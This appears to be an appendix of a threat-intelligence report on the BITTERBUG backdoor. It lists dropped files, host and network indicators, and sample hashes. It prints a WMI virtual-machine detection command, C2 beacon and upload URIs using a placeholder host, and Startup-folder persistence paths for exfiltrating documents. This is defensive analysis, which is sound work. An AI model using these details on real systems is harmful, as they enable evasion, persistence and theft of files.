@@ -1,0 +1,220 @@
+APPENDIX A: Malware Details
+BITTERBUG
+BITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,
+and automatically transferring selected files to its command and control (C2) server. BITTERBUG appears to be virtual machine aware
+and may not execute on a VMWare or VirtualBox VM. We have observed BITTERBUG installed by a self-extracting RAR archive
+disguised as a screensaver. Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and
+the BITTERBUG executable. The timeline below is of BITTERBUG activity from May 2013 through March 2014.
+Timeline of BITTERBUG characteristics vs.ThreatConnect events
+12 • OPERATION ARACHNOPHOBIA
+Details
+Upon execution the self-extracting RAR may install <BITTERBUG>.exe and the following DLLs:
+
+
+libcurld.dll – Used for downloading and uploading files
+
+
+msvcm90d.dll – C runtime library
+
+
+msvcp90d.dll – C runtime library
+
+
+msvcr90d.dll – C runtime library
+
+
+The self-extracting RAR may install the following benign configuration files:
+
+
+Microsoft.VC90.DebugCRT.manifest – Compilation artifact
+
+
+BtcirEt.DZU – Self-extracting RAR configuration file
+
+
+SJeXSrA.KNX – Self-extracting RAR configuration file
+
+
+VCAKSQl.TNT – Self-extracting RAR configuration file
+
+
+BITTERBUG first may execute the following Windows Management Instrumentation (WMI) command to detect the presence of a
+virtual machine (VM):
+
+cmd.exe /c wmic diskdrive list brief >
+
+```
+ “%APPDATA%\Microsoft\recovery.txt”
+```
+BITTERBUG then may open recovery.txt and check for the presence of strings VBox or VMware . The backdoor then may
+enter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13).
+Figure 13: Example recovery.txt file from VMware virtual machine
+Next BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised
+system. An example beacon request is shown in Figure 14.
+Host: POST /path_active.php?compname= <%COMPUTERNAME%><%USERNAME%> HTTP/1.1
+Accept: /
+Content-Length: 25
+Content-Type: application/x-www-form-urlencoded
+<%COMPUTERNAME%><%USERNAME%>
+Figure 14: Initial C2 beacon
+13 • OPERATION ARACHNOPHOBIA
+BITTERBUG then may perform an HTTP GET request for the following URI:
+http://<c2_location> /checkpkg.php?compname= <%COMPUTERNAME%>_<%USERNAME%>
+If the C2 server responds with a filename, the filename received is deleted from %APPDATA%\Microsoft<FILE_NAME_FROM_
+C2> . The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this
+command occurring in the wild.
+BITTERBUG then may attempt to download the files listed in Table 1. The purpose of the first three files is unknown. The final two
+files are downloaded to the user’s Startup directory and executed at startup in order to maintain persistence.
+Request URI Download Path
+http:///versionchk.php?srs=436712384 %APPDATA%\Microsoft\file.exe
+http:///vtris.php?srs=436712384 %APPDATA%\Microsoft\percf001.dat
+http:///vtris1.php?srs=436712384 %APPDATA%\Microsoft\percf002.dat
+http:///is_array_max.php?compname=
+<%COMPUTERNAME%>_<%USERNAME%>
+http:///is_array_pal.php?compname=
+<%COMPUTERNAME%>_<%USERNAME%>
+%USERPROFILE%\Start Menu\Programs\
+Startup\wincheck.exe
+%USERPROFILE%\Start Menu\Programs\
+Startup\winsquirt.exe
+Table 1: Files downloaded by the backdoor
+Next, BITTERBUG may scan through each drive letter and search recursively for files with the following file extensions: .doc,
+```
+.ppt, .xls, .pdf, .docx, .pptx, .pps, .xlsx
+```
+BITTERBUG then typically creates a file list containing all documents (excluding those whose filename contains MediaUtils) to
+the following locations:
+
+
+%APPDATA%\Microsoft\plang006.txt
+
+
+%APPDATA%\Microsoft\tlang006.txt
+
+
+BITTERBUG may also write a list of all running processes to:
+
+%APPDATA%\Microsoft\prc.dat
+
+Finally, BITTERBUG typically uploads the running process list, document file list, and all documents to the following URI:
+
+http://<c2_location> >
+/fetch_updates_flex.php?compname=<%COMPUTERNAME%>_<%USERNAME%
+
+Host-Based Signatures
+File System Residue
+BITTERBUG may be extracted along with the following embedded files:
+
+
+%USERPROFILE% \5rv3fgk6\ <BITTERBUG>.exe
+
+
+%USERPROFILE% \5rv3fgk6\libcurld.dll
+
+
+%USERPROFILE% \5rv3fgk6\msvcm90d.dll
+
+
+%USERPROFILE% \5rv3fgk6\msvcp90d.dll
+
+
+%USERPROFILE% \5rv3fgk6\msvcr90d.dll
+
+
+%USERPROFILE% \5rv3fgk6\Microsoft.VC90.DebugCRT.manifest
+
+
+14 • OPERATION ARACHNOPHOBIA
+
+
+%USERPROFILE% \5rv3fgk6\SJeXSrA.KNX
+
+
+%USERPROFILE% \5rv3fgk6\BtcirEt.DZU
+
+
+%USERPROFILE% \5rv3fgk6\VCAKSQl.TNT
+
+
+The malware may create the following files:
+
+
+%APPDATA%\Microsoft\recovery.txt
+
+
+%APPDATA%\Microsoft\plang006.txt
+
+
+%APPDATA%\Microsoft\tlang006.txt
+
+
+%APPDATA%\Microsoft\prc.dat
+
+
+%APPDATA%
+\Microsoft\file.exe
+
+
+%APPDATA%\Microsoft\percf001.dat
+
+
+%APPDATA%\Microsoft\percf002.dat
+
+
+%USERPROFILE% \Start Menu\Programs\Startupwincheck.exe
+
+
+%USERPROFILE%\Start Menu\Programs\Startup\winsquirt.exe
+
+
+Network-Based Signatures
+
+
+The malware typically communicates on TCP port 80:
+
+
+The malware may perform HTTP requests for the following URIs:
+
+
+http://<c2_location> /checkpkg.php?compname= <%COMPUTERNAME%>_<%USERNAME%>
+
+
+http://<c2_location>/is_array_max.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
+
+
+http://<c2_location>/is_array_pal.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
+
+
+http://<c2_location>/path_active.php?compname=<%COMPUTERNAME%>_<%USERNAME%>
+
+
+http://<c2_location> <%COMPUTERNAME%>_<%USERNAME%>
+/fetch_updates_flex.php?compname=
+
+
+http://<c2_location> /versionchk.php?srs=436712384
+
+
+http://<c2_location> /vtris.php?srs=436712384
+
+
+http://<c2_location> /vtris1.php?srs=436712384
+
+
+File Manipulations
+We observed other interesting operational security-oriented challenges in the post-blog post samples. In one case, an actor
+appeared to manually null out the “Cert-India” user directory in one of the file paths (see figures 15 and 16 below) contained in
+two binaries (support components). These files shared the same import hash (4e96e86db5a8a025b996aefdc218ff74) and were
+virtually the same files minus modification to a few bytes in the second sample.
+Figure 15: Original file content for 7588ff900e32145cbcbc77837237aef8
+15 • OPERATION ARACHNOPHOBIA
+Figure 16: Nulled file path for 26616e6662b390ebdb588cdaaae5e4f6
+As these samples point to, we also observed use of the C++ Boost libraries, which introduced a new file path to monitor for
+operational security purposes. We observed at least one case in which files mixed old and new file paths, as seen in the figures 17
+and 18 below.
+Figures 17 and 18: Screenshots from two locations in 6e8c4d2d5d4e5e7853a1842b04a6bfdf
+In both cases, it is possible that the actors intentionally did this in an attempt to mislead further research efforts into post
+blog samples or cast suspicion on “Cert-India” as a more-revealing element. For example, analysis of files deployed alongside
+the nulled-out “Cert-India” sample mentioned above revealed a lack of concern over the same string. Alternatively, these
+inconsistencies could also indicate sloppy tradecraft and/or teamwork.
+16 • OPERATION ARACHNOPHOBIA
